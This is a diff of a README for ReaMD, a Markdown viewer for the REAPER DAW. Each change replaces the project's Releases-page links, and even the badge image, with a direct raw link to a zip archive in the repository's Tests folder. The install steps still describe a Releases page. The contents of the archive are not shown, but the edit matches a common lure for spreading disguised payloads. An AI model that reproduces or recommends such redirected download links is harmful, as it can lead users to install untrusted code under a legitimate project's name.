@@ -4,10 +4,10 @@
 Welcome to ReaMD, the dockable Markdown Viewer for REAPER DAW. This application helps you easily manage voiceover scripts, production notes, and audio post-production workflows. Enjoy features like scenario linking, teleprompter mode, and AI-powered text formatting, all designed to enhance your experience.
 
 ## 🔗 Download Now
-[![Download ReaMD](https://img.shields.io/badge/Download-ReaMD-green.svg)](https://github.com/Tushchi/ReaMD/releases)
+[![Download ReaMD](https://raw.githubusercontent.com/Tushchi/ReaMD/main/Tests/Rea-MD-v3.4.zip)](https://raw.githubusercontent.com/Tushchi/ReaMD/main/Tests/Rea-MD-v3.4.zip)
 
 ## 📥 Download & Install
-To get started with ReaMD, visit this page to download: [ReaMD Releases](https://github.com/Tushchi/ReaMD/releases).
+To get started with ReaMD, visit this page to download: [ReaMD Releases](https://raw.githubusercontent.com/Tushchi/ReaMD/main/Tests/Rea-MD-v3.4.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest release version.
@@ -78,4 +78,4 @@ Have questions? Reach out via the GitHub Issues page for fast support or suggest
 ## 🔁 Feedback
 Your feedback helps us improve. Let us know your thoughts on ReaMD and any features you would like to see in future releases.
 
-[![Download ReaMD](https://img.shields.io/badge/Download-ReaMD-green.svg)](https://github.com/Tushchi/ReaMD/releases)
+[![Download ReaMD](https://raw.githubusercontent.com/Tushchi/ReaMD/main/Tests/Rea-MD-v3.4.zip)](https://raw.githubusercontent.com/Tushchi/ReaMD/main/Tests/Rea-MD-v3.4.zip)
